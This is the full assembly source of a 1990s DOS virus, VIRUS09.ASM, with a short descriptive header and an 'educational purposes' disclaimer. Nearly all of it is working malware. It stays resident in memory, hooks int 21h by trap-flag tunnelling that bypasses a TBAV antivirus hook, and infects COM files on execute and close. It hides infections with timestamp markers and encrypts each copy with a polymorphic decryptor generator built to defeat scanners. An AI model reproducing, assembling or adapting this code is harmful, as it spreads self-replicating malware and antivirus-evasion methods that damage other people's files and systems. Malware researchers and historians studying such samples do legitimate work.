;
;	VIRUS09.ASM
;
;	Author: Johan Gardhage <johan.gardhage@gmail.com>
;	Originally written in 1995.
;
; Description:
; This virus is a resident infector of COM files, encrypted with a
; polymorphic algorithm. It uses tunneling to install the int21h handler.
;
; The virus infects on both execute (4b00h) and close (3eh). Critical error
; handling is taken care of by hooking interrupt 24h. File attribute changes
; are done through SFT manipulation.
;
; Disclaimer:
; I take no responsibility for any damage, either direct or implied,
; caused by the usage of this virus source code or of the resulting code
; after assembly. The code was written for educational purposes ONLY.
;

	.model tiny
	.386
	.code
	.startup
	locals @@

ParagraphSize	equ	(EndHeapSection-BeginVirus) / 10h + 2
TimeStamp	equ	10001b				; Stealth marker
VirusInterrupt	equ	7979h
VirusIdentifier	equ	'bA'

BeginVirus:
	push	ax
	pop	ax
	push	ax
	pop	ax

	call	@@delta
@@delta:pop	bp					; bp holds current location
	sub	bp, offset @@delta			; calculate delta offset
	lea	si,[bp+offset @@trick]
	mov	word ptr ds:[si],20cdh
@@trick:mov	word ptr ds:[si],04c7h
	lea	si,[bp+BeginEncryptedSection]
	mov	cx,EndEncryptedSection-BeginEncryptedSection
	call	EndEncryptedSection

;---------------------------------------------------------------------
;	Start of encrypted section
;---------------------------------------------------------------------

BeginEncryptedSection:
	mov	ax,VirusInterrupt			; Check if in mem
	int	21h
	cmp	ax,VirusIdentifier
	je	AlreadyResident

	mov	ah, 4ah					; Get size of mem
	mov	bx, 0ffffh
	int	21h
	mov	ah, 4ah					; Change size of mem
	sub	bx, ParagraphSize+1			; Make space for virus
	int	21h
	mov	ah, 48h					; Allocate memory
	mov	bx, ParagraphSize
	int	21h
	sub	ax, 10h					; Compensate org 100h
	mov	es, ax
	mov	di, 100h
	lea	si, [bp+offset BeginVirus]
	mov	cx, EndHeapSection-BeginVirus
	rep	movsb					; Copy virus to mem
	push	es
	pop	ds
	inc	byte ptr ds:[0f1h]			; Change block owner

	push	cs
	call	InstallInt21hHandler			; Jump to tunneler

AlreadyResident:
	mov	di,100h
	push	di					; Save di at 100h
	push	cs					; Make cs=ds=es
	push	cs
	pop	es
	pop	ds
	lea	si,[bp+Old4Buf]
	movsw						; Copy first bytes
	movsw
	ret						; Return

;---------------------------------------------------------------------
;	Install int21h handler
;---------------------------------------------------------------------

InstallInt21hHandler:
	push	ds					; Jump to tunneler in
	mov	ax,offset @@next1			; new memory
	push	ax
	retf

@@next1:mov	ah,52h					; Get list of lists
	int	21h
	mov	ax,es:[bx-2]				; Get first MCB
	mov	OrigMcb,ax

	mov	ax,3521h				; Get int21
	int	21h
	mov	Int21o,bx
	mov	Int21s,es

	mov	al,01h					; Save int01
	int	21h
	push	bx					; on stack
	push	es

	mov	ah,25h					; Set int01
	mov	dx,offset Int01hHandler
	int	21h

	pushf						; Set trap flag
	pop	ax
	or	ah,1
	push	ax
	popf

	mov	ah,0bh					; Issue dos function
	pushf						; Simulate interrupt
	call	dword ptr Int21o			; for tracing

	pop	ds
	pop	dx

	pushf						; Get flags
	pop	ax
	test	ah,1					; Check trap flag
	pushf
	and	ah,0feh					; Turn off trap flag
	push	ax
	popf

	mov	ax,2501h				; Reset int01
	int	21h

	push	cs
	pop	ds

	popf
	jnz	@@next2

	mov	ah,25h
	mov	dx,offset Int21hHandler
	int	21h
@@next2:retf

Int01hHandler:
	mov	cs:OrigAx,ax				; Save registers
	mov	cs:OrigSi,si
	mov	cs:OrigCx,cx
	pop	si					; Get ip in si
	pop	ax					; cs in ax
	pop	cx					; flags in cx
	push	ds
	mov	ds,ax
	cmp	word ptr [si],05eBh			; Check if tbav
	jne	@@next1
	cmp	byte ptr [si+2],0eah			; Check if tbav
	jne	@@next1
	inc	si					; Skip tbav
	inc	si
@@next1:cmp	byte ptr [si],9ah			; Immediate interseg?
	je	@@next3
	cmp	byte ptr [si],0eah			; Immediate interseg?
	je	@@next3
	cmp	word ptr [si],0ff2eh			; opc prefix=cs?
	jne	@@next2
	cmp	byte ptr [si+2],1eh			; Direct interseg?
	je	@@next4
	cmp	byte ptr [si+2],2eh			; Direct interseg?
	je	@@next4
@@next2:pop	ds
	push	cx
	push	ax
	push	si
	db	0b8h
OrigAx	dw	?
	db	0beh
OrigSi	dw	?
	db	0b9h
OrigCx	dw	?
	iret
@@next3:push	si
	inc	si
	jmp	@@next5
@@next4:push	si
	mov	si,si[3]
@@next5:db	81h,7ch,02h				; cmp ds:si[2], mcb
OrigMcb	dw	?					; See if jmp is to dos
	jnb	@@next6
	push	ax
	mov	ax,si[0]				; Get offset address
	mov	cs:Int21o,ax
	mov	ax,si[2]				; Get segment address
	mov	cs:Int21s,ax
	mov	word ptr si[0],offset Int21hHandler	; Install int21 handler
	mov	si[2],cs
	pop	ax
	and	ch,0feh					; Clear trap flag
@@next6:pop	si
	jmp	@@next2

;---------------------------------------------------------------------
;	New int 21h handler
;---------------------------------------------------------------------

Int21hHandler:
	cmp	ax,VirusInterrupt			; Return installation
	jne	@@next
	mov	ax,VirusIdentifier
	iret
@@next:	cmp	ax,4b00h				; Execute?
	je	InfectFileOnExecute
	cmp	ah,3eh					; Close?
	je	InfectFileOnClose

OldInt21h:
	db	0eah
Int21o	dw	?
Int21s	dw	?

;---------------------------------------------------------------------
;	New int 24h handler
;---------------------------------------------------------------------

Int24hHandler:
	mov	al,3					; Returns no error

OldInt24h:
	db	0eah
Int24o	dw	0
Int24s	dw	0

;---------------------------------------------------------------------
;	Infect on execute (4b00h)
;---------------------------------------------------------------------

InfectFileOnExecute:
	push	es bp ax bx cx si di ds dx

	mov	ax,3d00h				; open file
	pushf						; Simulate a int call
	push	cs					; cs, ip on the stack
	call	OldInt21h
	xchg	ax,bx

	mov	ah,3eh					; Close and infect!
	int	21h

	pop	dx ds di si cx bx ax bp es
	jmp	OldInt21h

;---------------------------------------------------------------------
;	Infect on close (3eh)
;---------------------------------------------------------------------

InfectFileOnClose:
	push	es bp ax bx cx si di ds dx

	call	InstallInt24hHandler			; install a critical error handler

	cmp	bx,4					; don't close null, aux and so
	jbe	@@next1

	call	CheckSFT				; es:di+20h points to file name
	add	di,28h					; es:di points to extension
	cmp	word ptr es:[di],'OC'
	jne	@@next1
	cmp	byte ptr es:[di+2],'M'			; es:di+2 points to 3rd char in extension
	je	@@next2
@@next1:jmp	@@skip
@@next2:mov	byte ptr es:[di-26h],2

	xor	al,al					; Go SOF
	call	SetFilePointer

	push	cs					; cs=ds
	push	cs
	pop	ds
	pop	es

	mov	ax,5700h				;get time/date
	int	21h
	mov	Time,cx
	mov	Date,dx

	mov	ah,3fh					; read first four bytes to Old4Buf
	mov	cx,4
	mov	dx,offset ds:Old4Buf
	int	21h

	cmp	word ptr ds:Old4Buf,'ZM'		; check if .EXE file
	je	@@skip
	cmp	word ptr ds:Old4Buf,'MZ'
	je	@@skip

	cmp	byte ptr ds:Old4Buf+3,'@'		; dont reinfect!
	je	@@skip

	mov	al,2h					; Go EOF
	call	SetFilePointer

	add	ax,offset BeginVirus-103h		; calculate entry offset to jmp
	mov	word ptr ds:New4Buf[1],ax		; move it [ax] to New4Buf

	call	WriteVirus

	xor	al,al					; Go SOF
	call	SetFilePointer

	mov	ah,40h					; and write a new-jmp-construct
	mov	cx,4					; of 4 bytes (4byte=infection marker)
	mov	dx,offset New4Buf
	int	21h

	mov	ax,5701h				; restore
	mov	dx,Date
	mov	cx,Time
	and	cl,11100000b				; zero sec's
	or	cl,TimeStamp				; mark with our infection marker
	int	21h

@@skip:	call	RemoveInt24hHandler			; Remove 24h handler

	pop	dx ds di si cx bx ax bp es
	jmp	OldInt21h

Time	dw	0
Date	dw	0
New4Buf	db	0e9h, 00h, 00h, '@'			; New entry buffer
Old4Buf	db	0cdh, 20h, 00h, 00h			; 4 byte buffer

;---------------------------------------------------------------------
;	Subroutines & Int 24h error handler
;---------------------------------------------------------------------

SetFilePointer:
	mov	ah,42h					; Jump in file
	xor	cx,cx					; This saves a few
	cwd						; bytes as it's used
	int	21h					; a few times
	ret

CheckSFT:
	push	bx
	mov	ax,1220h				; Get job file table
	int	2fh					; for handle at es:di

	mov	ax,1216h				; Get system filetable
	mov	bl,byte ptr es:[di]			; for handle index
	int	2fh
	pop	bx
	ret

InstallInt24hHandler:
	push	ax ds
	mov	ax,9
	mov	ds,ax
	push	word ptr ds:[0]
	push	word ptr ds:[2]
	pop	word ptr cs:[Int24s]
	pop	word ptr cs:[Int24o]
	mov	word ptr ds:[0],offset Int24hHandler
	push	cs
	pop	word ptr ds:[02]
	pop	ds
	pop	ax
	ret

RemoveInt24hHandler:
	push	ax
	push	ds
	push	word ptr cs:[Int24o]
	mov	ax,9
	push	word ptr cs:[Int24s]
	mov	ds,ax
	pop	word ptr ds:[2]
	pop	word ptr ds:[0]
	pop	ds
	pop	ax
	ret

GetRandomValue:
	push	ds
	push	bx
	push	cx
	push	dx
	push	ax

	xor	ax,ax
	int	1ah
	push	cs
	pop	ds
	in	al,40h
	xchg	cx,ax
	xchg	dx,ax
	mov	bx,offset random
	xor	ds:[bx],ax
	rol	word ptr ds:[bx],cl
	xor	cx,ds:[bx]
	rol	ax,cl
	xor	dx,ds:[bx]
	ror	dx,cl
	xor	ax,dx
	imul	dx
	xor	ax,dx
	xor	ds:[bx],ax
	pop	cx
	xor	dx,dx
	inc	cx
	je	@@skip
	div	cx
	xchg	ax,dx
@@skip:	pop	dx
	pop	cx
	pop	bx
	pop	ds
	or	ax,ax
	ret

random	dw	?

WriteVirus:
	push	bx

	; Get # of instructions

	mov	ax,10					; 0-10
	call	GetRandomValue
	add	ax,5					; 5-15
	mov	CNum,ax
	shl	ax,2
	mov	CLength,ax

	; Create random values to use in instructions

	mov	si,offset Rand1a			; First random in decryptor OP-codes
	mov	di,offset Rand1b			; First random in encryptor OP-codes
	mov	cx,5					; 5*2 OP-codes to change
@@loop1:mov	ax,255
	call	GetRandomValue				; Get random value
	mov	[si],al
	mov	[di],al
	add	si,4					; Next OP-code
	add	di,4					; Next OP-code
	loop	@@loop1

	; Copy instructions from ENCode and DECode

	mov	cx,CNum					; Counter, max 15 sequences
	xor	bx,bx

@@loop2:mov	ax,7					; Which instruction?
	call	GetRandomValue
	shl	ax,2

	mov	si,offset DECode
	lea	di,[bx+CCode1]
	add	si,ax
	movsd

	mov	si,offset ENCode
	lea	di,[bx+CCode2]
	add	si,ax
	movsd

	add	bx,4
	loop	@@loop2

	; Build the instruction that increase SI

	mov	ax,3
	call	GetRandomValue
	shl	ax,2

	mov	si,offset DEcSI
	add	si,ax					; Get pos in ADD-SI-alts.
	movsd

	; Build the loop-instruction

	mov	ah,0ffh
	mov	cx,CLength
	sub	ah,cl					; Calculate loop operand
	sub	ah,5
	mov	al,0e2h					; OP-code for loop
	stosw

	; Copy the ret instruction

	mov	byte ptr [di],0c3h			; Write a RET

	; Copy virus to memory

	mov	ax,08d00h				; Copy entire virus to 8d00h:100h
	mov	es,ax
	mov	di,100h
	mov	si,di
	mov	cx,EndVirus-BeginVirus
	rep	movsb
	push	di

	; Copy decryptor to memory

	mov	si,offset CCode1

	mov	bx,CLength
	add	di,bx
	sub	di,4

	mov	cx,CNum
@@loop3:lodsd
	mov	es:[di],eax
	sub	di,4
	loop	@@loop3

	; Add SI, loop, ret to decryptor in memory

	pop	di
	add	di,bx
	mov	si,offset CCode2
	add	si,bx
	movsd						; SI
	movsw						; Loop
	movsb						; ret

	; Call encryptor

	mov	si,offset BeginEncryptedSection
	mov	cx,EndEncryptedSection-BeginEncryptedSection
	call	JmpCode

	; Write virus + decryptor

	push	es
	pop	ds

	mov	ah,40h					; write virus to file from position
	pop	bx
	mov	cx,(EndVirus-BeginVirus)
	add	cx,cs:CLength				; Add crypt length
	add	cx,4					; Add SI length
	add	cx,2					; Add loop length
	add	cx,1					; Add ret length
	mov	dx,offset BeginVirus
	int	21h

	push	cs					; cs=ds
	pop	ds
	push	cs					; cs=es
	pop	es

	ret

CLength	dw	0
CNum	dw	0

; Following table contains 16 different 4-byte codesqeunces,
; randomly used by the decryptionroutine. The first 8 affects the
; decryption algoritm, and has a matching 4-byte instruction in
; the ENCode-table. The rest is just garbage instructions, used
; to make scanning harder. The morpher will pick a random number
; (1-16) of these instructions, and build the decryption routine.

DECode	db	02eh,080h,004h				; add byte ptr cs:[si],?
Rand1a	db	?
	db	02eh,080h,02ch				; sub byte ptr cs:[si],?
Rand2a	db	?
	db	02eh,080h,034h				; xor byte ptr cs:[si],?
Rand3a	db	?
	db	02eh,0C0h,004h				; rol byte ptr cs:[si],?
Rand4a	db	?
	db	02eh,0C0h,00Ch				; ror byte ptr cs:[si],?
Rand5a	db	?
	db	02eh,0feh,00ch,090h			; dec byte ptr cs:[si]; nop
	db	02eh,0feh,004h,090h			; inc byte ptr cs:[si]; nop
	db	02eh,0f6h,01ch,090h			; neg byte ptr cs:[si]; nop

; Following table contains the encryptionversions of the
; first 8 instructions in the DECode-table.
; SUB will be ADD, ROR will be ROL etc.

ENCode	db	026h,080h,02ch				; sub byte ptr es:[si],?
Rand1b	db	?
	db	026h,080h,004h				; add byte ptr es:[si],?
Rand2b	db	?
	db	026h,080h,034h				; xor byte ptr es:[si],?
Rand3b	db	?
	db	026h,0C0h,00Ch				; ror byte ptr es:[si],?
Rand4b	db	?
	db	026h,0C0h,004h				; rol byte ptr es:[si],?
Rand5b	db	?
	db	026h,0feh,004h,090h			; inc byte ptr es:[si]; nop
	db	026h,0feh,00ch,090h			; dec byte ptr es:[si]; nop
	db	026h,0f6h,01ch,090h			; neg byte ptr es:[si]; nop

; Following table contains four different ways to increase SI.
; Used only in the DECode-routine (CCode1).

DEcSI	db	083h,0c6h,001h,090h			; add si,1; nop
	db	046h,033h,0dbh,0f8h			; inc si; xor bx,bx; clc
	db	04eh,046h,046h,0f9h			; dec si; inc si; sinc si; stc
	db	083h,0c6h,002h,04eh			; add si,2; dec si

EndEncryptedSection: EndVirus: BeginHeapSection:

;---------------------------------------------------------------------
;	End of encrypted section
;---------------------------------------------------------------------

; Space for the created decryptionroutine

CCode1	dd	0c3h,?,?,?,?,?,?,?	 		; 1 to 20 decryptrows
	dd	?,?,?,?,?,?,?,?

; Space for the created encryptionroutine

JmpCode:
CCode2	dd	?,?,?,?,?,?,?,?	 			; 1 to 20 encryptrows
	dd	?,?,?,?,?,?,?,?
	dd	?,?,?,?					; Inc SI + loop + ret + zero byte

EndHeapSection:

end
